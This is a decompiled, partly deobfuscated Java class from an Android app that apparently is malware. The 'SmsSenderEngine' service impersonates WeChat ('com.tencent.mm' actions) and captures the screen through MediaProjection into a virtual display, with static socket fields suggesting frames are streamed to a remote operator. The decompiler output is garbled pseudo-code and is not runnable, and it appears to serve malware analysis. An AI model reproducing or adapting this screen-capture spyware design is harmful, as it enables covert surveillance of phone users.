package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: SmsSenderEngine
 * Original: Lcom/tencent/skatinghsatinbintegralj9;
 */
public class SmsSenderEngine extends Service {

    // === FIELDS ===
    static final String ACTION_RECORD = "com.tencent.mm.RECORD";
    static final String ACTION_SHUTDOWN = "com.tencent.mm.SHUTDOWN";
    private static final String CHANNEL_WHATEVER = "Scaning";
    static final String EXTRA_RESULT_CODE = "resultCode";
    static final String EXTRA_RESULT_INTENT = "resultIntent";
    public static int FPS = 0;
    public static boolean ISON = false;
    public static boolean Lo = false;
    private static final int NOTIFY_ID = 9906;
    public static String PID;
    public static int Q = 0;
    static final int VIRT_DISPLAY_FLAGS = 2;
    public static boolean ctd;
    public static String display_height;
    public static String display_width;
    public static OutputStream out;
    private static MediaProjection projection;
    public static Socket sk;
    public static Object syc;
    public static boolean usd;
    private static VirtualDisplay vdisplay;
    public List bts;
    private Handler handler;
    private final HandlerThread handlerThread;
    private MiscHelper2 it;
    private MediaProjectionManager mgr;
    private int resultCode;
    private Intent resultData;
    private WindowManager wmgr;

    // === METHODS ===

    static void StaticInitializer() {
        v0 = new Object();
        // new Object()
        SmsSenderEngine.syc = v0;
        return;
    }

    public void Constructor() {
        // new Service()
        v0 = new HandlerThread();
        v2 = v3.getClass();
        v2 = v1.getSimpleName();
        v2 = 10;
        // new HandlerThread(v1, 10)
        v3.handlerThread = v0;
        v0 = new ArrayList();
        // new ArrayList()
        v3.bts = v0;
        return;
    }

    static void access$000(SmsSenderEngine param0) {
        v0.startCapture();
        return;
    }

    static VirtualDisplay access$100() {
        v0 = SmsSenderEngine.vdisplay;
        return v0;
    }

    public static void di() {
        v0 = 0;
        SmsSenderEngine.Lo = 0;
        0.shutdownOutput();
        0.shutdownInput();
        0.getOutputStream();
        0.close();
        0.getInputStream();
        0.close();
        0.close();
        if (0 == null || 0 == 0) { // goto +8
        0.close();
        v0 = 0;
        SmsSenderEngine.out = 0;
        return;
    }

    private void foregroundify() {
        v0 = new Intent();
        v1 = SmsSenderEngine.class;
        // new Intent(v2, v1)
        v1 = "com.tencent.mm.RECORD";
        v0.setAction("com.tencent.mm.RECORD");
        v2.startService(v0);
        return;
    }

    private void startCapture() {
        v0 = v10.mgr;
        v1 = v10.resultCode;
        v2 = v10.resultData;
        v0 = v0.getMediaProjection(v1, v2);
        SmsSenderEngine.projection = v0;
        v0 = new MiscHelper2();
        // new MiscHelper2(v10)
        v10.it = v0;
        v0 = new SmsSenderEngine$4();
        // new SmsSenderEngine$4(v10)
        v1 = SmsSenderEngine.projection;
        v2 = "andshooter";
        v3 = v10.it;
        v4 = v3.getWidth();
        v4 = v10.it;
        v4.getHeight();
        v5 = v10.getResources();
        v5 = v5.getDisplayMetrics();
        v5 = v5.densityDpi;
        v6 = 2;
        v7 = v10.it;
        v8 = v7.getSurface();
        v8 = 0;
        v9 = v10.handler;
        v1 = MediaProjection.createVirtualDisplay(...);
        SmsSenderEngine.vdisplay = v1;
        v1 = SmsSenderEngine.projection;
        v1.registerCallback(v0, "andshooter");
        return;
    }

    public static void stopCapture() {
        v0 = SmsSenderEngine.projection;
        if (v0 == null || v0 == 0) { // goto +13
        v0.stop();
        v0 = SmsSenderEngine.vdisplay;
        v0.release();
        v0 = 0;
        SmsSenderEngine.projection = 0;
        return;
    }

    public void FindNewIcon() {
        v0 = new Thread();
        v1 = new SmsSenderEngine$2();
        // new SmsSenderEngine$2(v2)
        // new Thread(v1)
        v0.start();
        return;
    }

     Handler getHandler() {
        v0 = v1.handler;
        return v0;
    }

     WindowManager getWindowManager() {
        v0 = v1.wmgr;
        return v0;
    }

    public IBinder onBind(Intent param0) {
        v2 = new IllegalStateException();
        v0 = "Binding not supported.";
        // new IllegalStateException("Binding not supported.")
        throw v2;
    }

    public void onCreate() {
        v2.onCreate();
        v0 = "media_projection";
        v2.getSystemService("media_projection");
        v2.mgr = "media_projection";
        v1 = v2.getSystemService("window");
        v2.wmgr = "window";
        "window".start();
        v1 = v2.handlerThread;
        v1.getLooper();
        // new Handler(v1)
        v2.handler = "window";
        return;
    }

    public void onDestroy() {
        SmsSenderEngine.stopCapture();
        v0.onDestroy();
        return;
    }

    public int onStartCommand(Intent param0, int param1, int param2) {
        v4 = v1.getApplicationContext();
        v4 = "SCH";
        v0 = "720";
        v3 = My_tunesxconcerningn10_Settings.read(v3, "SCH", "720");
        SmsSenderEngine.display_width = v3;
        v3 = v1.getApplicationContext();
        v3 = My_tunesxconcerningn10_Settings.read(v3, "SCW", "1080");
        SmsSenderEngine.display_height = v3;
        v3 = v2.getAction();
        if (v3 != null && v3 != 0) { // goto +53
        v3 = "resultCode";
        v4 = 1337;
        v2.getIntExtra("resultCode", 1337);
        v1.resultCode = "resultCode";
        v4 = v2.getParcelableExtra("resultIntent");
        v1.resultData = "resultIntent";
        v4 = 10;
        v4 = v2.getIntExtra("Q", 10);
        SmsSenderEngine.Q = "Q";
        v4 = 5;
        v2.getIntExtra("F", 5);
        SmsSenderEngine.FPS = "F";
        v2 = v2.getStringExtra("P");
        SmsSenderEngine.PID = v2;
        v1.foregroundify();
        // goto (branch)
        v2.getAction();
        v2 = "com.tencent.mm.RECORD".equals(5);
        if ("com.tencent.mm.RECORD" == null || "com.tencent.mm.RECORD" == 0) { // goto +27
        v2 = v1.resultData;
        if (v2 == null || v2 == 0) { // goto +6
        v1.FindNewIcon();
        // goto (branch)
        v2 = new Intent();
        // new Intent(v1, "com.tencent.mm.RECORD")
        v3 = 268435456; // 0x10000000
        v2.addFlags("com.tencent.mm.RECORD");
        v1.startActivity(v2);
        // goto (branch)
        v2.getAction();
        v2 = "com.tencent.mm.SHUTDOWN".equals(v2);
        if (v2 == null || v2 == 0) { // goto +15
        v2 = 0;
        SmsSenderEngine.ISON = 0;
        SmsSenderEngine.stopCapture();
        v2 = 1;
        v1.stopForeground(1);
        v1.stopSelf();
        v2 = 2;
        return 2;
    }

    public void pr() {
        v0 = new Thread();
        v1 = new SmsSenderEngine$1();
        // new SmsSenderEngine$1(v2)
        // new Thread(v1)
        v0.start();
        return;
    }

     void processImage(byte[] param0) {
        v0 = new SmsSenderEngine$3();
        // new SmsSenderEngine$3(v1, v2)
        v0.start();
        return;
    }
}
